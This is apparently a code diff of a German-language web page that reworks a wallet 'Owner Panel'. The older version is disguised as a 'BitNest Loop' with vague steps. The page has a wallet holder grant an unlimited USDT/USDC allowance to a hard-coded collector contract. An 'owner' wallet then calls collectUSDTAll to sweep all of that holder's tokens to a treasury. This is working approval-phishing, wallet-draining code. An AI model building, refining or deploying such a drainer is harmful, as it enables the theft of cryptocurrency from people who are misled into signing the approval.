@@ -3,131 +3,143 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Owner Panel – Auto Wallet A</title>
+  <title>Owner Panel – Multi-Token Collector</title>
   <style>
-    body{
-      font-family: Arial, sans-serif;
-      background:#0f172a;
-      color:#fff;
-      display:flex;
-      min-height:100vh;
-      justify-content:center;
-      align-items:center;
-      margin:0;
-      padding:16px;
-    }
-    .box{
-      background:#020617;
-      padding:22px;
-      border-radius:14px;
-      width:360px;
-      box-shadow:0 10px 30px rgba(0,0,0,.35);
-    }
-    h2{ margin-top:0; }
-    button{
-      background:#22c55e;
-      border:none;
-      padding:12px;
-      width:100%;
-      font-size:15px;
-      font-weight:bold;
-      cursor:pointer;
-      border-radius:10px;
-      margin-top:10px;
-    }
-    button.secondary{ background:#334155; }
-    .mono{
-      font-family: ui-monospace, Menlo, Monaco, Consolas, monospace;
-      font-size:12px;
-      word-break:break-all;
-      opacity:.9;
-    }
-    .muted{ font-size:12px; opacity:.75; line-height:1.35; }
-    #status{ margin-top:10px; min-height:22px; }
+    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:16px; }
+    .box{ background:#020617; padding:25px; border-radius:16px; width:420px; box-shadow:0 20px 50px rgba(0,0,0,.5); border: 1px solid #1e293b; }
+    h2{ margin-top:0; text-align: center; color: #f8fafc; }
+    .step { background: #1e293b; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
+    .step-title { font-weight: bold; font-size: 12px; color: #3b82f6; text-transform: uppercase; margin-bottom: 10px; display: flex; justify-content: space-between; }
+    select, button { width: 100%; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: 0.2s; }
+    select { background: #334155; color: white; margin-bottom: 10px; }
+    button { background:#22c55e; color: white; margin-top: 8px; }
+    button:hover { opacity: 0.9; transform: translateY(-1px); }
+    button.secondary { background:#475569; }
+    button.warning { background: #f59e0b; }
+    .mono { font-family: 'Courier New', monospace; font-size:11px; background: #000; padding: 6px; border-radius: 4px; display: block; color: #10b981; word-break: break-all; margin-top: 5px; }
+    .balance-tag { background: #064e3b; color: #34d399; padding: 2px 6px; border-radius: 4px; font-size: 11px; }
+    #status { margin-top:15px; padding: 12px; border-radius: 8px; font-size: 13px; text-align: center; font-weight: 500; min-height: 20px; }
+    .status-info { background: rgba(59, 130, 246, 0.1); color: #60a5fa; }
+    .status-err { background: rgba(239, 68, 68, 0.2); color: #f87171; }
+    .status-ok { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
   </style>
 </head>
 <body>
 
 <div class="box">
-  <h2>BitNest Loop</h2>
+  <h2>Owner Panel</h2>
 
-  <div class="muted">
-    Schritt 1: Wallet  verbinden / Wallet Connect<br/>
-    Schritt 2: Bestätigen / Confirm<br/>
-    Schritt 3: USDT/USDC Adaption
+  <div class="step">
+    <div class="step-title">1. Token-Typ wählen</div>
+    <select id="tokenType" onchange="checkBalance()">
+      <option value="USDT">USDT (Tether)</option>
+      <option value="USDC">USDC (Circle)</option>
+    </select>
   </div>
 
-  <button class="secondary" onclick="connectWalletA()">Connect Wallet</button>
-  <div class="mono" id="walletA">Wallet: –</div>
-function connectWalletA(){ return connectUniversal(); }
-  <button onclick="collectAll()">Restart Loop</button>
-
-  <div id="status"></div>
-
-  <div class="muted" style="margin-top:10px;">
-<br/>
-    <span class="mono"></span>
+  <div class="step">
+    <div class="step-title">2. Quelle (Wallet A) <span id="balanceVal" class="balance-tag" style="display:none;">0.00</span></div>
+    <button class="secondary" onclick="connectA()">Wallet A verbinden</button>
+    <span class="mono" id="addrA">Nicht verbunden</span>
   </div>
+
+  <div class="step">
+    <div class="step-title">3. Berechtigung</div>
+    <button class="warning" onclick="approveToken()">Allowance freigeben</button>
+  </div>
+
+  <div class="step" style="border-left-color: #22c55e;">
+    <div class="step-title">4. Transfer auslösen</div>
+    <button onclick="executeCollect()">Alles einziehen</button>
+  </div>
+
+  <div id="status" class="status-info">Bereit zur Verbindung</div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
 <script>
-  // ===== CONFIG =====
-  const COLLECTOR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+  const COLLECTOR_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+  const TOKEN_MAP = {
+    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum Mainnet
+    USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
+  };
 
-  const collectorAbi = [
-    "function collectUSDTAll(address from) external"
+  const ERC20_ABI = [
+    "function approve(address spender, uint256 amount) public returns (bool)",
+    "function balanceOf(address account) public view returns (uint256)",
+    "function decimals() public view returns (uint8)"
   ];
+  const COLLECTOR_ABI = ["function collectUSDTAll(address from) external"];
 
-  let walletAAddress = null;
+  let walletA = null;
 
-  function setStatus(t){ document.getElementById("status").innerText = t; }
-async function connectUniversal(){
-  try{
-    if(window.ethereum){
-      // MetaMask / Brave / Rabby (Desktop oder Wallet Browser)
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
-      const signer = await provider.getSigner();
-      walletAAddress = await signer.getAddress();
-      document.getElementById("walletA").innerText = "Wallet: " + walletAAddress;
-      setStatus("✅ Verbunden (Injected Wallet)");
-    } else {
-      // ALLE Mobile Wallets (Trust, MetaMask Mobile, Rainbow, etc.)
-      await window.Web3ModalEthers.modal.open();
-      const wcProvider = await window.Web3ModalEthers.modal.getWalletProvider();
-      const provider = new ethers.BrowserProvider(wcProvider);
-      const signer = await provider.getSigner();
-      walletAAddress = await signer.getAddress();
-      document.getElementById("walletA").innerText = "Wallet: " + walletAAddress;
-      setStatus("✅ Verbunden (WalletConnect)");
-    }
-  }catch(e){
-    console.error(e);
-    setStatus("❌ Wallet Verbindung fehlgeschlagen");
+  function log(msg, type='info') {
+    const s = document.getElementById("status");
+    s.innerText = msg;
+    s.className = "status-" + type;
   }
-}
-    async function collectAll(){
-    try{
-      if(!walletAAddress) return setStatus("❌ Erst Wallet A verbinden");
 
+  async function checkBalance() {
+    if(!walletA) return;
+    try {
       const provider = new ethers.BrowserProvider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
+      const symbol = document.getElementById("tokenType").value;
+      const contract = new ethers.Contract(TOKEN_MAP[symbol], ERC20_ABI, provider);
+      const bal = await contract.balanceOf(walletA);
+      const dec = await contract.decimals();
+      const formatted = ethers.formatUnits(bal, dec);
+      const badge = document.getElementById("balanceVal");
+      badge.innerText = parseFloat(formatted).toFixed(2) + " " + symbol;
+      badge.style.display = "inline";
+    } catch(e) { console.error(e); }
+  }
+
+  async function connectA() {
+    if(!window.ethereum) return alert("MetaMask installieren!");
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const accts = await provider.send("eth_requestAccounts", []);
+      walletA = accts[0];
+      document.getElementById("addrA").innerText = walletA;
+      await checkBalance();
+      log("✅ Wallet A verbunden", "ok");
+    } catch(e) { log("❌ Verbindung abgebrochen", "err"); }
+  }
+
+  async function approveToken() {
+    if(!walletA) return log("❌ Erst Wallet A verbinden", "err");
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
-
-      const c = new ethers.Contract(COLLECTOR, collectorAbi, signer);
-
-      setStatus("Bitte als Owner bestätigen…");
-      const tx = await c.collectUSDTAll(walletAAddress);
+      const symbol = document.getElementById("tokenType").value;
+      const token = new ethers.Contract(TOKEN_MAP[symbol], ERC20_ABI, signer);
+      
+      log(`Bitte Approve für ${symbol} bestätigen...`);
+      const tx = await token.approve(COLLECTOR_ADDR, ethers.MaxUint256);
       await tx.wait();
+      log("✅ Freigabe erteilt!", "ok");
+    } catch(e) { log("❌ Freigabe gescheitert", "err"); }
+  }
 
-      setStatus("✅ USDT wurde an die Treasury gesendet");
-    }catch(e){
-      console.error(e);
-      setStatus("❌ Fehler (bist du mit der Owner-Wallet verbunden?)");
-    }
+  async function executeCollect() {
+    if(!walletA) return log("❌ Wallet A fehlt", "err");
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const current = await signer.getAddress();
+      
+      if(current.toLowerCase() === walletA.toLowerCase()) {
+        return log("⚠️ Jetzt in MetaMask zur OWNER-Wallet wechseln!", "err");
+      }
+
+      const collector = new ethers.Contract(COLLECTOR_ADDR, COLLECTOR_ABI, signer);
+      log("Starte Einzug...");
+      const tx = await collector.collectUSDTAll(walletA);
+      await tx.wait();
+      log("✅ Erfolg! USDT/USDC an Treasury gesendet", "ok");
+      await checkBalance();
+    } catch(e) { log("❌ Fehler: Kein Owner-Recht?", "err"); }
   }
 </script>
-
 </body>
 </html>
